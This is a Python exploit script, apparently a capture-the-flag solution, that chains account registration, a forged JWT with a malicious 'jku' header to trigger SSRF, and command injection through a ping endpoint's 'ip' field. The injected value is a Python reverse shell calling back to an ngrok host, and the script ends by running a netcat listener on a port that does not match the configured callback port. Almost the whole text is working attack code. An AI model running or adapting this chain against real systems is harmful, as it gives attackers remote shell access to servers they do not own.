#!/usr/bin/env python3
from patsac import *
from Crypto.PublicKey import RSA
import requests
import jwt
import sys
import os
import time

URL = "http://127.0.0.1:8000" # CHANGE ME
if len(sys.argv) == 2 and sys.argv[1].startswith("http"):
    URL = sys.argv[1]
    URL = URL[:-1] if URL.endswith("/") else URL

print("Target:", URL)

LHOST = "0.tcp.ap.ngrok.io" # CHANGE ME
LPORT = 10880 # CHANGE ME

def register(username, password):
    print("[1/5] Register an account...")
    url = f"{URL}/api/register"
    data_json={"username": username, "password": password}
    r = requests.post(url, json=data_json)
    if r.status_code == 200:
        return "OK"
    else:
        print(r.text)
        raise Exception("Registrasi gagal.")

def craft_jwt_ssrf(username):
    print("[2/5] Craft JWT for SSRF...")
    custom_rsakey = RSA.generate(2048).exportKey()
    add_headers = {"jku": f"http://localhost:8000/api/verify_user_account__but_this_endpoint_is_still_under_development?username={username}", "kid": "0J8GUGGbJC3CQ2ulfCK18ecoRx1S0bv-7sxjn7cp-ew"}
    payload = {"sub": "fake payload, doesn't matter."}
    jwt_ssrf = jwt.encode(payload, custom_rsakey, "RS256", headers=add_headers)
    return jwt_ssrf

def trigger_ssrf(token):
    print("[3/5] Trigger SSRF to verify account...")
    url = URL
    cookies = {"auth": token}
    r = requests.get(url, cookies=cookies, allow_redirects=False)
    return

def login(username ,password):
    print("[4/5] Login an account...")
    url = f"{URL}/api/login"
    data_json = {"username": username, "password": password}
    r = requests.post(url, json=data_json)
    return r.cookies.get("auth")

def trigger_rce(token):
    print("[5/5] Trigger RCE...")
    url = f"{URL}/api/check_ping_result"
    cookies = {"auth": token}
    data_json = {"ip": f"8.8.8.8; python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn([\"/bin/bash\",\"-i\"])'"}
    try:
        requests.post(url, cookies=cookies, json=data_json, timeout=0.1)
    except:
        pass

def main():
    d = 1 # delay
    uname = os.urandom(16).hex()
    pwd = os.urandom(16).hex()
    print("Username :", uname)
    print("Password :", pwd)
    if not (s := register(uname, pwd)):
        print("Fail on register.")
        exit(1)
    time.sleep(d)
    jwt_ssrf = craft_jwt_ssrf(uname)
    time.sleep(d)
    trigger_ssrf(jwt_ssrf)
    time.sleep(d)
    if not (token := login(uname, pwd)):
        print(token)
        print("Fail on login.")
        exit()
    time.sleep(d)
    trigger_rce(token)
    print("="*10)
    print("export TERM=xterm-256color")
    print("export SHELL=bash")
    print("="*10)
    os.system("nc -lvnp 13337")
    return 0


if __name__ == "__main__":
    main()
